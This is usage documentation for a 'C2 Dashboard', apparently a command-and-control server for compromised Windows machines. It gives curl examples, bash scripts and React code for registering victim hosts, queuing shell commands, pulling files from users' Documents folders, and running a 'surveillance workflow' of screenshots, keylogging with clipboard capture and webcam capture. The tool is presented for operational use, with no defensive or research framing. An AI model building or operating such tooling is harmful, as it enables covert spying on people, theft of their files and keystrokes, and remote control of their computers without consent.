# C2 Dashboard - Usage Examples

## Complete Workflow Examples

### Example 1: Register and Monitor a Client

#### Step 1: Register Client
```bash
curl -X POST http://localhost:3000/api/clients/register \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "WORKSTATION-01",
    "username": "john.doe",
    "os": "Windows 11",
    "ip_address": "192.168.1.50",
    "architecture": "x64",
    "is_admin": true
  }'
```

**Response:**
```json
{
  "success": true,
  "data": {
    "client": {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "hostname": "WORKSTATION-01",
      "username": "john.doe",
      "os": "Windows 11",
      "ip_address": "192.168.1.50",
      "architecture": "x64",
      "is_admin": true,
      "status": "online",
      "last_seen": "2024-03-22T10:00:00Z",
      "created_at": "2024-03-22T10:00:00Z"
    }
  }
}
```

Copy the `client.id` for next steps: `550e8400-e29b-41d4-a716-446655440000`

#### Step 2: Send System Metrics
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl -X POST http://localhost:3000/api/system/metrics/update \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "cpu_usage": 45.5,
    "memory_usage": 62.3,
    "memory_total": 16000,
    "disk_usage": 50.0,
    "disk_total": 500000,
    "network_interfaces": {
      "eth0": {"rx": 1024000000, "tx": 512000000},
      "wlan0": {"rx": 512000000, "tx": 256000000}
    },
    "running_processes": ["explorer.exe", "chrome.exe", "vscode.exe"],
    "network_connections": {
      "tcp": 45,
      "udp": 12
    }
  }'
```

#### Step 3: Get Client Info
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl http://localhost:3000/api/clients/$CLIENT_ID/info
```

**Response includes:**
- Client details
- Recent commands
- Latest metrics
- File operations
- Activity summary

---

### Example 2: Execute Commands

#### Step 1: Queue a Shell Command
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl -X POST http://localhost:3000/api/commands/queue \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "command_type": "shell",
    "command_name": "whoami",
    "parameters": {
      "timeout": 5000
    }
  }'
```

**Response:**
```json
{
  "success": true,
  "data": {
    "command": {
      "id": "660f9511-f30c-52e5-b827-557766551111",
      "client_id": "550e8400-e29b-41d4-a716-446655440000",
      "command_type": "shell",
      "command_name": "whoami",
      "parameters": {
        "timeout": 5000
      },
      "status": "pending",
      "result": null,
      "error_message": null,
      "created_at": "2024-03-22T10:05:00Z",
      "updated_at": "2024-03-22T10:05:00Z"
    }
  }
}
```

Copy command ID: `660f9511-f30c-52e5-b827-557766551111`

#### Step 2: Check Command Status
```bash
COMMAND_ID="660f9511-f30c-52e5-b827-557766551111"

curl http://localhost:3000/api/commands/$COMMAND_ID/status
```

#### Step 3: Update Command with Result
```bash
COMMAND_ID="660f9511-f30c-52e5-b827-557766551111"

curl -X POST http://localhost:3000/api/commands/$COMMAND_ID/status \
  -H "Content-Type: application/json" \
  -d '{
    "status": "completed",
    "result": "WORKSTATION-01\\john.doe"
  }'
```

---

### Example 3: File Operations

#### Step 1: Create Download Operation
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl -X POST http://localhost:3000/api/files/operations \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "file_path": "C:\\Users\\john.doe\\Documents\\report.pdf",
    "file_name": "report.pdf",
    "file_type": "pdf",
    "operation": "download"
  }'
```

**Response:**
```json
{
  "success": true,
  "data": {
    "file_operation": {
      "id": "770g0622-g41d-63f6-c938-668877662222",
      "client_id": "550e8400-e29b-41d4-a716-446655440000",
      "file_path": "C:\\Users\\john.doe\\Documents\\report.pdf",
      "file_name": "report.pdf",
      "file_type": "pdf",
      "operation": "download",
      "status": "pending"
    }
  }
}
```

#### Step 2: Update File Status with Size
```bash
FILE_ID="770g0622-g41d-63f6-c938-668877662222"

curl -X POST http://localhost:3000/api/files/$FILE_ID/status \
  -H "Content-Type: application/json" \
  -d '{
    "status": "completed",
    "local_path": "/tmp/downloads/report.pdf",
    "file_size": 2048000,
    "progress": 100
  }'
```

#### Step 3: List All File Operations
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl "http://localhost:3000/api/files/list?client_id=$CLIENT_ID&operation=download"
```

---

### Example 4: Complete Surveillance Workflow

#### Step 1: Queue Screenshot
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl -X POST http://localhost:3000/api/commands/queue \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "command_type": "surveillance",
    "command_name": "screenshot",
    "parameters": {
      "quality": "high",
      "monitor": 1
    }
  }'
```

#### Step 2: Queue Keylog
```bash
curl -X POST http://localhost:3000/api/commands/queue \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "command_type": "surveillance",
    "command_name": "keylog",
    "parameters": {
      "duration": 60000,
      "include_clipboard": true
    }
  }'
```

#### Step 3: Queue Webcam Capture
```bash
curl -X POST http://localhost:3000/api/commands/queue \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "'$CLIENT_ID'",
    "command_type": "surveillance",
    "command_name": "webcam",
    "parameters": {
      "frames": 5,
      "quality": "medium"
    }
  }'
```

#### Step 4: View All Queued Commands
```bash
CLIENT_ID="550e8400-e29b-41d4-a716-446655440000"

curl "http://localhost:3000/api/commands/list?client_id=$CLIENT_ID&status=pending"
```

---

### Example 5: React Component Integration

```typescript
// app/components/ClientActions.tsx
'use client'

import { useClients, useCommands, useMetrics } from '@/hooks/use-api'
import { useEffect, useState } from 'react'

export function ClientActions({ clientId }: { clientId: string }) {
  const { getClientInfo, loading: clientLoading } = useClients()
  const { queueCommand, loading: cmdLoading } = useCommands()
  const { updateMetrics } = useMetrics()
  const [client, setClient] = useState<any>(null)

  useEffect(() => {
    const load = async () => {
      const response = await getClientInfo(clientId)
      if (response.success) {
        setClient(response.data.client)
      }
    }
    load()
  }, [clientId, getClientInfo])

  const handleScreenshot = async () => {
    const response = await queueCommand({
      client_id: clientId,
      command_type: 'surveillance',
      command_name: 'screenshot',
    })
    if (response.success) {
      console.log('Screenshot queued:', response.data.command)
    }
  }

  const handleSystemInfo = async () => {
    const response = await queueCommand({
      client_id: clientId,
      command_type: 'system',
      command_name: 'system_info',
    })
    if (response.success) {
      console.log('System info queued:', response.data.command)
    }
  }

  const handleMetricsUpdate = async () => {
    const response = await updateMetrics({
      client_id: clientId,
      cpu_usage: Math.random() * 100,
      memory_usage: Math.random() * 100,
      memory_total: 16000,
      disk_usage: Math.random() * 100,
      disk_total: 500000,
    })
    if (response.success) {
      console.log('Metrics updated')
    }
  }

  if (clientLoading || !client) return <div>Loading...</div>

  return (
    <div className="space-y-4">
      <h2>Client: {client.hostname}</h2>
      <div className="space-x-2">
        <button onClick={handleScreenshot} disabled={cmdLoading}>
          Take Screenshot
        </button>
        <button onClick={handleSystemInfo} disabled={cmdLoading}>
          Get System Info
        </button>
        <button onClick={handleMetricsUpdate} disabled={cmdLoading}>
          Update Metrics
        </button>
      </div>
    </div>
  )
}
```

---

### Example 6: Dashboard Stats Script

```bash
#!/bin/bash
# dashboard-stats.sh

echo "=== C2 Dashboard Statistics ==="
echo ""

# Get overview
echo "Dashboard Overview:"
curl -s http://localhost:3000/api/dashboard/overview | jq '.data.summary'

echo ""
echo "System Health:"
curl -s http://localhost:3000/api/dashboard/health | jq '.data'

echo ""
echo "All Clients:"
curl -s http://localhost:3000/api/clients/list | jq '.data.stats'

echo ""
echo "Command Statistics:"
curl -s http://localhost:3000/api/commands/list | jq '.data.stats'

echo ""
echo "File Operations:"
curl -s http://localhost:3000/api/files/list | jq '.data.stats'
```

Run with: `bash dashboard-stats.sh`

---

### Example 7: Automated Monitoring Script

```bash
#!/bin/bash
# monitor.sh

CLIENT_ID="$1"

if [ -z "$CLIENT_ID" ]; then
  echo "Usage: $0 <client_id>"
  exit 1
fi

echo "Monitoring client: $CLIENT_ID"

while true; do
  echo "=== $(date) ==="
  
  # Get client info
  curl -s http://localhost:3000/api/clients/$CLIENT_ID/info | jq '.data.client | {status, last_seen}'
  
  # Get latest metrics
  curl -s "http://localhost:3000/api/system/$CLIENT_ID/metrics?type=latest" | jq '.data.metrics | {cpu_usage, memory_usage}'
  
  # Get pending commands
  curl -s "http://localhost:3000/api/commands/list?client_id=$CLIENT_ID&status=pending" | jq '.data | length'
  
  echo ""
  sleep 5
done
```

Run with: `bash monitor.sh 550e8400-e29b-41d4-a716-446655440000`

---

### Example 8: Batch Client Registration

```bash
#!/bin/bash
# register-batch.sh

for i in {1..10}; do
  echo "Registering client $i..."
  
  curl -X POST http://localhost:3000/api/clients/register \
    -H "Content-Type: application/json" \
    -d '{
      "hostname": "PC-'$i'",
      "username": "user'$i'",
      "os": "Windows 11",
      "ip_address": "192.168.1.'$((100 + i))'",
      "is_admin": '$((i % 2))'
    }' > /tmp/client_$i.json
  
  echo "Client $i registered"
  sleep 1
done

echo "All clients registered!"
ls -la /tmp/client_*.json
```

---

### Example 9: Data Export Script

```bash
#!/bin/bash
# export-data.sh

echo "Exporting data..."

# Export clients
curl -s http://localhost:3000/api/clients/list | jq '.data.clients' > clients.json

# Export all commands
curl -s http://localhost:3000/api/commands/list | jq '.data.commands' > commands.json

# Export metrics
curl -s http://localhost:3000/api/system/metrics | jq '.data.metrics' > metrics.json

# Export files
curl -s http://localhost:3000/api/files/list | jq '.data.files' > files.json

echo "Exports complete:"
echo "  - clients.json"
echo "  - commands.json"
echo "  - metrics.json"
echo "  - files.json"
```

---

### Example 10: Real-time Dashboard Update

```typescript
// app/hooks/useDashboardRefresh.ts
'use client'

import { useCallback, useEffect, useState } from 'react'
import { useDashboard, useClients, useCommands } from '@/hooks/use-api'

export function useDashboardRefresh(interval = 5000) {
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  const dashboard = useDashboard()
  const clients = useClients()
  const commands = useCommands()

  const refresh = useCallback(async () => {
    setLoading(true)
    try {
      const [overview, clientList, cmdList] = await Promise.all([
        dashboard.getOverview(),
        clients.listClients(),
        commands.listCommands(),
      ])

      setData({
        overview: overview.data,
        clients: clientList.data?.clients,
        commands: cmdList.data?.commands,
      })
    } finally {
      setLoading(false)
    }
  }, [dashboard, clients, commands])

  useEffect(() => {
    refresh()
    const timer = setInterval(refresh, interval)
    return () => clearInterval(timer)
  }, [refresh, interval])

  return { data, loading, refresh }
}
```

Use in component:
```typescript
function Dashboard() {
  const { data, loading } = useDashboardRefresh(5000)
  
  if (loading) return <Spinner />
  
  return (
    <div>
      <Stats data={data?.overview} />
      <ClientList data={data?.clients} />
      <CommandList data={data?.commands} />
    </div>
  )
}
```

---

## Test Workflow with Mock Clients

### Complete Mock Test Flow

```bash
# 1. Register 5 mock clients
curl -X POST http://localhost:3000/api/test/mock-client \
  -d '{"action": "register", "count": 5}' \
  -H "Content-Type: application/json"

# 2. Record metrics
curl -X POST http://localhost:3000/api/test/mock-client \
  -d '{"action": "metrics"}' \
  -H "Content-Type: application/json"

# 3. Queue commands
curl -X POST http://localhost:3000/api/test/mock-client \
  -d '{"action": "commands", "count": 3}' \
  -H "Content-Type: application/json"

# 4. Check dashboard
curl http://localhost:3000/api/dashboard/overview | jq .

# 5. List all clients
curl http://localhost:3000/api/clients/list | jq '.data.clients | length'

# 6. Cleanup
curl -X POST http://localhost:3000/api/test/mock-client \
  -d '{"action": "cleanup"}' \
  -H "Content-Type: application/json"
```

---

*These examples provide a complete workflow for using the C2 Dashboard. Mix and match based on your needs!*
